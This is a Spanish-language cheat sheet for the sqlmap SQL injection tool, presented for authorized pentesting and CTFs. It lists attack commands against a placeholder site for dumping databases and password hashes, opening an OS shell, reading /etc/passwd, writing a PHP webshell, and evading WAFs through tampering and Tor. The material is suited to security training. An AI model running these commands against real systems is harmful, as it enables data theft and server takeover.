# sqlmap — SQL Injection Automation

Herramienta de detección y explotación automática de SQL injection. Soporta MySQL, PostgreSQL, Oracle, MSSQL, SQLite, y más.

**Contexto:** Uso en pentesting autorizado, CTFs, y laboratorios de seguridad.

---

## Uso Básico

### Detección
```bash
# Test básico en URL con parámetro
sqlmap -u "http://target.com/page?id=1"

# Modo batch (no preguntar, usar defaults)
sqlmap -u "http://target.com/page?id=1" --batch

# POST data
sqlmap -u "http://target.com/login" --data "user=admin&pass=test"

# Con cookie
sqlmap -u "http://target.com/page?id=1" --cookie "session=abc123"

# Con headers custom
sqlmap -u "http://target.com/page?id=1" -H "Authorization: Bearer <token>"

# Desde request de Burp (más preciso)
# Guardar request desde Burp → Copy to file
sqlmap -r request.txt

# Especificar parámetro a testear
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# Especificar DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

### Nivel y Riesgo
```bash
# Level (1-5): cantidad de payloads testeados
# 1 = default, básico
# 2 = agrega cookie testing
# 3 = agrega User-Agent, Referer testing
# 5 = máximo (lento)
sqlmap -u "http://target.com/page?id=1" --level=3

# Risk (1-3): peligrosidad de payloads
# 1 = default, seguro
# 2 = agrega time-based heavy queries
# 3 = agrega OR-based (puede modificar data)
sqlmap -u "http://target.com/page?id=1" --risk=3

# Máxima detección
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

---

## Enumeración de Base de Datos

```bash
# Listar databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Listar tablas de un database
sqlmap -u "http://target.com/page?id=1" -D <database> --tables

# Listar columnas de una tabla
sqlmap -u "http://target.com/page?id=1" -D <database> -T <table> --columns

# Dump de tabla completa
sqlmap -u "http://target.com/page?id=1" -D <database> -T <table> --dump

# Dump de columnas específicas
sqlmap -u "http://target.com/page?id=1" -D <database> -T <table> -C "username,password" --dump

# Dump de todo el database
sqlmap -u "http://target.com/page?id=1" -D <database> --dump-all

# Dump de todos los databases
sqlmap -u "http://target.com/page?id=1" --dump-all

# Buscar columnas con nombre específico
sqlmap -u "http://target.com/page?id=1" --search -C password

# Buscar tablas con nombre específico
sqlmap -u "http://target.com/page?id=1" --search -T users

# Info del database actual
sqlmap -u "http://target.com/page?id=1" --current-db
sqlmap -u "http://target.com/page?id=1" --current-user
sqlmap -u "http://target.com/page?id=1" --is-dba
sqlmap -u "http://target.com/page?id=1" --passwords   # Dump password hashes
sqlmap -u "http://target.com/page?id=1" --privileges
sqlmap -u "http://target.com/page?id=1" --roles
```

---

## Técnicas de Inyección

```bash
# Especificar técnicas
# B = Boolean-based blind
# E = Error-based
# U = Union query-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries
sqlmap -u "http://target.com/page?id=1" --technique=BEU

# Solo union-based (más rápido si funciona)
sqlmap -u "http://target.com/page?id=1" --technique=U

# Solo time-based (más sigiloso)
sqlmap -u "http://target.com/page?id=1" --technique=T

# Especificar prefijo/sufijo de payload
sqlmap -u "http://target.com/page?id=1" --prefix="'" --suffix="-- -"

# Second-order injection
sqlmap -u "http://target.com/page?id=1" --second-url="http://target.com/results"
```

---

## Explotación Avanzada

### OS Shell / Command Execution
```bash
# Shell interactiva del sistema operativo
sqlmap -u "http://target.com/page?id=1" --os-shell

# Ejecutar comando específico
sqlmap -u "http://target.com/page?id=1" --os-cmd="whoami"

# SQL shell interactiva
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Ejecutar query SQL
sqlmap -u "http://target.com/page?id=1" --sql-query="SELECT @@version"
```

### File Operations
```bash
# Leer archivo del servidor
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Escribir archivo al servidor
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Registro Windows
```bash
# Leer clave de registro
sqlmap -u "http://target.com/page?id=1" --reg-read --reg-key="HKLM\SOFTWARE" --reg-value="Version"
```

---

## Evasión de WAF/Filtros

### Tamper Scripts
```bash
# Usar tamper script
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Múltiples tampers
sqlmap -u "http://target.com/page?id=1" --tamper="space2comment,between,randomcase"

# Tampers comunes:
# space2comment    → Reemplaza espacios con /**/
# between          → Reemplaza > con NOT BETWEEN 0 AND
# randomcase       → Alterna mayúsculas/minúsculas
# charencode       → URL-encode characters
# space2plus       → Reemplaza espacios con +
# equaltolike      → Reemplaza = con LIKE
# base64encode     → Encode payloads en Base64
# apostrophenullencode → Encode ' con %00%27
# chardoubleencode → Double URL-encode
# unionalltounion  → UNION ALL SELECT → UNION SELECT
# percentage       → Agrega % entre caracteres

# Listar todos los tampers disponibles
sqlmap --list-tampers
```

### Otras Evasiones
```bash
# Random User-Agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Delay entre requests
sqlmap -u "http://target.com/page?id=1" --delay=1

# Retries
sqlmap -u "http://target.com/page?id=1" --retries=3

# Timeout
sqlmap -u "http://target.com/page?id=1" --timeout=30

# Proxy
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Tor
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5

# Chunked transfer encoding
sqlmap -u "http://target.com/page?id=1" --chunked

# HTTP parameter pollution
sqlmap -u "http://target.com/page?id=1" --hpp
```

---

## Puntos de Inyección

### Headers
```bash
# En User-Agent
sqlmap -u "http://target.com/page" --headers="User-Agent: *" --level=3

# En Referer
sqlmap -u "http://target.com/page" --headers="Referer: *" --level=3

# En header custom
sqlmap -u "http://target.com/page" --headers="X-Custom: *"
```

### Cookies
```bash
# Inyectar en cookie
sqlmap -u "http://target.com/page" --cookie="id=1*" --level=2
```

### JSON / XML Body
```bash
# JSON POST
sqlmap -u "http://target.com/api" --data='{"id": 1}' --content-type="application/json"

# XML POST
sqlmap -u "http://target.com/api" --data='<root><id>1</id></root>' --content-type="application/xml"
```

### REST Parameters
```bash
# Inyectar en path
sqlmap -u "http://target.com/api/users/1*"
```

---

## Output y Performance

```bash
# Verbose (0-6)
sqlmap -u "http://target.com/page?id=1" -v 3

# Output a directorio
sqlmap -u "http://target.com/page?id=1" --output-dir=/tmp/sqlmap

# Threads (más rápido)
sqlmap -u "http://target.com/page?id=1" --threads=10

# Flush session (empezar de cero)
sqlmap -u "http://target.com/page?id=1" --flush-session

# Forzar re-testing
sqlmap -u "http://target.com/page?id=1" --fresh-queries

# Solo mostrar payloads
sqlmap -u "http://target.com/page?id=1" -v 3 --no-cast
```

---

## Patrones de Uso

### CTF Quick Win
```bash
# Detección rápida + dump
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" --batch -D <db> --tables
sqlmap -u "http://target.com/page?id=1" --batch -D <db> -T <table> --dump
```

### Desde Burp Request
```bash
# 1. En Burp, click derecho → Copy to file → request.txt
# 2. Marcar punto de inyección con * si es necesario
sqlmap -r request.txt --batch --dbs
```

### MSSQL → OS Shell
```bash
# Con DBA privileges en MSSQL
sqlmap -u "http://target.com/page?id=1" --os-shell --dbms=mssql
# Usa xp_cmdshell automáticamente
```

### MySQL → File Read/Write
```bash
# Leer archivos del servidor
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --dbms=mysql

# Escribir webshell
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --dbms=mysql
```

---

## Tips

- **`--batch` para CTFs** — acepta todo automáticamente, ahorra tiempo
- **`-r request.txt` > URL manual** — más preciso, preserva headers y cookies
- **Empezar con `--technique=BEU`** — si no funciona, agregar time-based (T)
- **`--tamper` no es magia** — entiende qué filtra el WAF antes de elegir tampers
- **`--threads=10`** — seguro en la mayoría de casos, acelera significativamente
- **Session files** — sqlmap guarda progreso, puedes retomar donde dejaste
- **`--os-shell` requiere DBA** — verificar con `--is-dba` primero
- **Proxy a Burp** — usar `--proxy` para ver exactamente qué envía sqlmap
